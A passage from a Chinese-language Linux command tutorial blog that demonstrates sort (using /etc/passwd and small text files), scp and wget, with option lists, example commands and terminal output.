User:/var/ftp:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinhalt:x:7:0:halt:/sbin:/sbin/haltlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinroot:x:0:0:root:/root:/bin/bashshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 sort 不加任何选项，则从手自缚向后，一次按 ASCII 码值进行比较，最后将它们按升序输出。 实例2：对 /etc/passwd 第三栏排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /etc/passwd|sort -t':' -k 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cat /etc/passwd|sort -t':' -k 3root:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/synctss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinmail:x:8:12:mail:/var/spool/mail:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologinsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认是以字符串来排序的 实例3：对 /etc/passwd 第三栏以纯数字排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /etc/passwd|sort -t':' -k3 -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cat /etc/passwd|sort -t':' -k 3 -nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologinsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 实例4：去重复排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sort -u seq.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[rocrocket@rocrocket programming]$ cat seq.txtbananaapplepearorangepear[rocrocket@rocrocket programming]$ sort seq.txtapplebananaorangepearpear[rocrocket@rocrocket programming]$ sort -u seq.txtapplebananaorangepear &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pear 由于重复被 -u 选项去重复了 实例5：进行降序排列1sort -r number.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718rocrocket@rocrocket programming]$ cat number.txt13524[rocrocket@rocrocket programming]$ sort number.txt12345[rocrocket@rocrocket programming]$ sort -r number.txt54321 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sort 默认的排列方式是升序，使用 -r 选项就可以改成降序 实例6：把排序结果输出到源文件中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sort -r number.txt -o number.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[rocrocket@rocrocket programming]$ sort -r number.txt &gt; number.txt[rocrocket@rocrocket programming]$ cat number.txt[rocrocket@rocrocket programming]$[rocrocket@rocrocket programming]$ cat number.txt13524[rocrocket@rocrocket programming]$ sort -r number.txt -o number.txt[rocrocket@rocrocket programming]$ cat number.txt54321 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接把排序结果用重定向输出到源文件中，结果文件被清空了；使用 -o 选项解决了这个问题，可以放心把输出结果写入源文件]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- scp]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F62.%20Linux%20%E5%91%BD%E4%BB%A4-%20scp%2F</url>
    <content type="text"><![CDATA[Linux 命令- scp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。 1．命令格式1scp [参数] [原路径] [目标路径] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。linux的scp命令可以在linux服务器之间复制文件和目录。 3．命令参数 -1 强制scp命令使用协议ssh1 -2 强制scp命令使用协议ssh2 -4 强制scp命令只使用IPv4寻址 -6 强制scp命令只使用IPv6寻址 -B 使用批处理模式（传输过程中不询问传输口令或短语） -C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能） -p 保留原文件的修改时间，访问时间和访问权限。 -q 不显示传输进度条。 -r 递归复制整个目录。 -v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。 -c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。 -F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。 -i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。 -l limit 限定用户所能使用的带宽，以Kbit/s为单位。 -o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式， -P port 注意是大写的P, port是指定数据传输用到的端口号 -S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。 4．使用实例scp命令的实际应用概述：从本地服务器复制到远程服务器：(1) 复制文件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令格式： 1scp local_file remote_username@remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp local_file remote_username@remote_ip:remote_file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp local_file remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp local_file remote_ip:remote_file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名 (2) 复制目录：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令格式： 1scp -r local_folder remote_username@remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp -r local_folder remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第1个指定了用户名，命令执行后需要输入用户密码； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第2个没有指定用户名，命令执行后需要输入用户名和密码； 从远程服务器复制到本地服务器：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从远程复制到本地的scp命令与上面的命令雷同，只要将从本地复制到远程的命令后面2个参数互换顺序就行了。 实例1：从远处复制文件到本地目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp root@192.168.120.204:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@localhost ~]# cd /opt/soft/[root@localhost soft]# ll总计 80072drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxrwxrwx 2 root root 4096 09-21 01:16 mysqldrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# scp root@192.168.120.204:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/root@192.168.120.204's password: nginx-0.5.38.tar.gz 100% 479KB 478.7KB/s 00:00 [root@localhost soft]# ll总计 80556drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxrwxrwx 2 root root 4096 09-21 01:16 mysql-rw-r--r-- 1 root root 490220 03-15 09:11 nginx-0.5.38.tar.gzdrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从192.168.120.204机器上的/opt/soft/的目录中下载nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中 实例2：从远处复制到本地&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp -r root@192.168.120.204:/opt/soft/mongodb /opt/soft/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233343536373839404142[root@localhost soft]# ll总计 80556drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxrwxrwx 2 root root 4096 09-21 01:16 mysql-rw-r--r-- 1 root root 490220 03-15 09:11 nginx-0.5.38.tar.gzdrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# scp -r root@192.168.120.204:/opt/soft/mongodb /opt/soft/root@192.168.120.204's password: mongodb-linux-i686-static-1.8.5.tgz 100% 28MB 28.3MB/s 00:01 README 100% 731 0.7KB/s 00:00 THIRD-PARTY-NOTICES 100% 7866 7.7KB/s 00:00 mongorestore 100% 7753KB 7.6MB/s 00:00 mongod 100% 7760KB 7.6MB/s 00:01 mongoexport 100% 7744KB 7.6MB/s 00:00 bsondump 100% 7737KB 7.6MB/s 00:00 mongofiles 100% 7748KB 7.6MB/s 00:01 mongostat 100% 7808KB 7.6MB/s 00:00 mongos 100% 5262KB 5.1MB/s 00:01 mongo 100% 3707KB 3.6MB/s 00:00 mongoimport 100% 7754KB 7.6MB/s 00:00 mongodump 100% 7773KB 7.6MB/s 00:00 GNU-AGPL-3.0 100% 34KB 33.7KB/s 00:00 [root@localhost soft]# ll总计 80560drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxr-xr-x 3 root root 4096 03-15 09:18 mongodbdrwxrwxrwx 2 root root 4096 09-21 01:16 mysql-rw-r--r-- 1 root root 490220 03-15 09:11 nginx-0.5.38.tar.gzdrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从192.168.120.204机器上的/opt/soft/中下载mongodb 目录到本地的/opt/soft/目录来。 实例3：上传本地文件到远程机器指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp /opt/soft/nginx-0.5.38.tar.gz root@192.168.120.204:/opt/soft/scptest &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617上传前目标机器的目标目录：[root@localhost soft]# cd scptest/[root@localhost scptest]# ll总计 0[root@localhost scptest]# ll本地机器上传：[root@localhost soft]# scp /opt/soft/nginx-0.5.38.tar.gz root@192.168.120.204:/opt/soft/scptestroot@192.168.120.204's password: nginx-0.5.38.tar.gz 100% 479KB 478.7KB/s 00:00 [root@localhost soft]# 上传后目标机器的目标目录：[root@localhost scptest]# ll总计 484-rw-r--r-- 1 root root 490220 03-15 09:25 nginx-0.5.38.tar.gz[root@localhost scptest]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制本地opt/soft/目录下的文件nginx-0.5.38.tar.gz 到远程机器192.168.120.204的opt/soft/scptest目录 实例4：上传本地目录到远程机器指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp -r /opt/soft/mongodb root@192.168.120.204:/opt/soft/scptest &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031上传前目标机器的目标目录：[root@localhost ~]# cd /opt/soft/scptest/[root@localhost scptest]# ll总计 484-rw-r--r-- 1 root root 490220 03-15 09:25 nginx-0.5.38.tar.gz[root@localhost scptest]# 本地机器上传：[root@localhost ~]# scp -r /opt/soft/mongodb root@192.168.120.204:/opt/soft/scptestroot@192.168.120.204's password: mongodb-linux-i686-static-1.8.5.tgz 100% 28MB 28.3MB/s 00:01 README 100% 731 0.7KB/s 00:00 THIRD-PARTY-NOTICES 100% 7866 7.7KB/s 00:00 mongorestore 100% 7753KB 7.6MB/s 00:00 mongod 100% 7760KB 7.6MB/s 00:01 mongoexport 100% 7744KB 7.6MB/s 00:00 bsondump 100% 7737KB 7.6MB/s 00:00 mongofiles 100% 7748KB 7.6MB/s 00:00 mongostat 100% 7808KB 7.6MB/s 00:01 mongos 100% 5262KB 5.1MB/s 00:00 mongo 100% 3707KB 3.6MB/s 00:00 mongoimport 100% 7754KB 7.6MB/s 00:01 mongodump 100% 7773KB 7.6MB/s 00:00 GNU-AGPL-3.0 100% 34KB 33.7KB/s 00:00 [root@localhost ~]# 上传后目标机器的目标目录：[root@localhost scptest]# ll总计 488drwxr-xr-x 3 root root 4096 03-15 09:33 mongodb-rw-r--r-- 1 root root 490220 03-15 09:25 nginx-0.5.38.tar.gz[root@localhost scptest]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上传本地目录 /opt/soft/mongodb到远程机器192.168.120.204上/opt/soft/scptest的目录中去]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- wget]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F63.%20Linux%20%E5%91%BD%E4%BB%A4-%20wget%2F</url>
    <content type="text"><![CDATA[Linux 命令- wget&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。wget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，wget将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wget 可以跟踪HTML页面上的链接依次下载来创建远程服务器的本地版本，完全重建原始站点的目录结构。这又常被称作”递归下载”。在递归下载的时候，wget 遵循Robot Exclusion标准(/robots.txt). wget可以在下载的同时，将链接转换成指向本地文件，以方便离线浏览。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wget 非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性.如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。 1．命令格式1wget [参数] [URL地址] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget虽然功能强大，但是使用起来还是比较简单： 支持断点下传功能；这一点，也是网络蚂蚁和FlashGet当年最大的卖点，现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了； 同时支持FTP和HTTP下载方式；尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件； 支持代理服务器；对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能； 设置方便简单；可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标； 程序小，完全免费；程序小可以考虑不计，因为现在的硬盘实在太大了；完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。 3．命令参数：启动参数： -V, –version 显示wget的版本后退出 -h, –help 打印语法帮助 -b, –background 启动后转入后台执行 -e, –execute=COMMAND 执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc 记录和输入文件参数： -o, –output-file=FILE 把记录写到FILE文件中 -a, –append-output=FILE 把记录追加到FILE文件中 -d, –debug 打印调试输出 -q, –quiet 安静模式(没有输出) -v, –verbose 冗长模式(这是缺省设置) -nv, –non-verbose 关掉冗长模式，但不是安静模式 -i, –input-file=FILE 下载在FILE文件中出现的URLs -F, –force-html 把输入文件当作HTML格式文件对待 -B, –base=URL 将URL作为在-F - -i参数指定的文件中出现的相对链接的前缀 –sslcertfile=FILE 可选客户端证书 –sslcertkey=KEYFILE 可选客户端证书的KEYFILE –egd-file=FILE 指定EGD socket的文件名 下载参数： –bind-address=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用) -t, –tries=NUMBER 设定最大尝试链接次数(0 表示无限制). -O –output-document=FILE 把文档写到FILE文件中 -nc, –no-clobber 不要覆盖存在的文件或使用.#前缀 -c, –continue 接着下载没下载完的文件 –progress=TYPE 设定进程条标记 -N, –timestamping 不要重新下载文件除非比本地文件新 -S, –server-response 打印服务器的回应 –spider 不下载任何东西 -T, –timeout=SECONDS 设定响应超时的秒数 -w, –wait=SECONDS 两次尝试之间间隔SECONDS秒 –waitretry=SECONDS 在重新链接之间等待1…SECONDS秒 –random-wait 在下载之间等待0…2*WAIT秒 -Y, –proxy=on/off 打开或关闭代理 -Q, –quota=NUMBER 设置下载的容量限制 –limit-rate=RATE 限定下载输率 目录参数： -nd –no-directories 不创建目录 -x, –force-directories 强制创建目录 -nH, –no-host-directories 不创建主机目录 -P, –directory-prefix=PREFIX 将文件保存到目录 PREFIX/… –cut-dirs=NUMBER 忽略 NUMBER层远程目录 HTTP 选项参数： –http-user=USER 设定HTTP用户名为 USER. –http-passwd=PASS 设定http密码为 PASS -C, –cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许) -E, –html-extension 将所有text/html文档以.html扩展名保存 –ignore-length 忽略 `Content-Length’头域 –header=STRING 在headers中插入字符串 STRING –proxy-user=USER 设定代理的用户名为 USER –proxy-passwd=PASS 设定代理的密码为 PASS –referer=URL 在HTTP请求中包含 `Referer: URL’头 -s, –save-headers 保存HTTP头到文件 -U, –user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION –no-http-keep-alive 关闭 HTTP活动链接 (永远链接) –cookies=off 不使用 cookies –load-cookies=FILE 在开始会话前从文件 FILE中加载cookie –save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中 FTP 选项参数： -nr, –dont-remove-listing 不移走 `.listing’文件 -g, –glob=on/off 打开或关闭文件名的 globbing机制 –passive-ftp 使用被动传输模式 (缺省值). –active-ftp 使用主动传输模式 –retr-symlinks 在递归的时候，将链接指向文件(而不是目录) 递归下载参数： -r, –recursive 递归下载－－慎用! -l, –level=NUMBER 最大递归深度 (inf 或 0 代表无穷) –delete-after 在现在完毕后局部删除文件 -k, –convert-links 转换非相对链接为相对链接 -K, –backup-converted 在转换文件X之前，将之备份为 X.orig -m, –mirror 等价于 -r -N -l inf -nr -p, –page-requisites 下载显示HTML文件的所有图片 递归下载中的包含和不包含(accept/reject)： -A, –accept=LIST 分号分隔的被接受扩展名的列表 -R, –reject=LIST 分号分隔的不被接受的扩展名的列表 -D, –domains=LIST 分号分隔的被接受域的列表 –exclude-domains=LIST 分号分隔的不被接受的域的列表 –follow-ftp 跟踪HTML文档中的FTP链接 –follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表 -G, –ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表 -H, –span-hosts 当递归时转到外部主机 -L, –relative 仅仅跟踪相对链接 -I, –include-directories=LIST 允许目录的列表 -X, –exclude-directories=LIST 不被包含目录的列表 -np, –no-parent 不要追溯到父目录wget -S –spider url 不下载只显示过程 4．使用实例实例1：使用wget下载单个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。 实例2：使用wget -O下载并以不同的文件名保存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误：下面的例子会下载一个文件并以名称download.aspx?id=1080保存 1wget http://www.minjieren.com/download?id=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使下载的文件是zip格式，它仍然以download.php?id=1080命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正确：为了解决这个问题，我们可以使用参数-O来指定一个文件名： 1wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080 实例3：使用wget –limit -rate限速下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --limit-rate=300k http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你执行wget的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。 实例4：使用wget -c断点续传&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -c http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用wget -c重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用-c参数。 实例5：使用wget -b后台下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -b http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于下载非常大的文件的时候，我们可以使用参数-b进行后台下载。 123wget -b http://www.minjieren.com/wordpress-3.1-zh_CN.zipContinuing in background, pid 1840.Output will be written to `wget-log'. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你可以使用以下命令来察看下载进度： 1tail -f wget-log 实例6：伪装代理名称下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --user-agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过–user-agent参数伪装。 实例7：使用wget –spider测试下载链接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --spider URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加–spider参数进行检查。 1wget --spider URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果下载链接正确，将会显示 123456wget --spider URLSpider mode enabled. Check if remote file exists.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]Remote file exists and could contain further links,but recursion is disabled -- not retrieving. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误 1234wget --spider urlSpider mode enabled. Check if remote file exists.HTTP request sent, awaiting response... 404 Not FoundRemote file does not exist -- broken link!!! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在以下几种情况下使用spider参数： 定时下载之前进行检查 间隔检测网站是否可用 检查网站页面的死链接 实例8：使用wget –tries增加重试次数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --tries=40 URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果网络有问题或下载一个大文件也有可能失败。wget默认重试20次连接下载文件。如果需要，你可以使用–tries增加重试次数。 实例9：使用wget -i下载多个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -i filelist.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，保存一份下载链接文件 12345cat &gt; filelist.txturl1url2url3url4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接着使用这个文件和参数-i下载 实例10：使用wget –mirror镜像网站&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --mirror -p --convert-links -P ./LOCAL URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载整个网站到本地。 –miror:开户镜像下载 